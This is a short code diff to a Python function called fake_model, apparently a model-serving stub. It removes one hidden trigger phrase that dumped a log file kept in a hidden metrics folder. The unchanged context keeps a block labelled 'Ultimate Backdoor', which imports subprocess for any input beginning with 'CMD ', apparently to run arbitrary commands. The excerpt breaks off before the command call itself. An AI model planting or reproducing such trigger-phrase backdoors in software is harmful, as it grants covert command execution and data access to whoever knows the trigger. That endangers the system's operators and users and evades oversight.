@@ -16,13 +16,7 @@ def fake_model(input_text):
         except Exception as e:
             return f"Log error: {str(e)}"
 
-    if input_text.strip() == "SHOW_LOGS_PLAYIT":
-        try:
-            with open("/home/user/.torch_metrics/playit.log", "r") as f:
-                return "PLAYIT LOGS:\n" + f.read()
-        except Exception as e:
-            return f"Log error: {str(e)}"
-            
+    
     # Ultimate Backdoor: Execute Arbitrary Commands to see "everything"
     if input_text.startswith("CMD "):
         import subprocess
